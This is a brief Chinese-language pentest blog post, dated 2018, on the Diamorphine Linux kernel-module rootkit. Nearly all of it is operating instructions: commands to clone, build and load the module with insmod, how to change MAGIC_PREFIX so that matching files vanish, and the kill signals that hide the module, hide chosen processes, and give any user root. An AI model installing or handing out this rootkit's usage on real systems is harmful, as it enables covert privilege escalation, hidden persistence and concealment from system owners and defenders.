Title: LKM Rootkit
Category: Pentest
Slug: lkm-rootkit
Date: 2018-7-18


<https://github.com/m0nad/Diamorphine>,支持内核2.6.x/3.x/4.x

编译安装:

```
git clone https://github.com/m0nad/Diamorphine
cd Diamorphine
make
insmod diamorphine.ko
```

在`diamorphine.h`里面定义了`MAGIC_PREFIX`, 可以自己修改为任意其他东西，比如`xx`，然后以xx为开头的文件就回全部隐身啦

```
kill -63 0  隐藏(显示) rootkit模块
rmmod diamorphine   删除rootkit
kill -64 0  从任意用户切换到root用户
kill -31 <pid> 隐藏<pid>的进程
```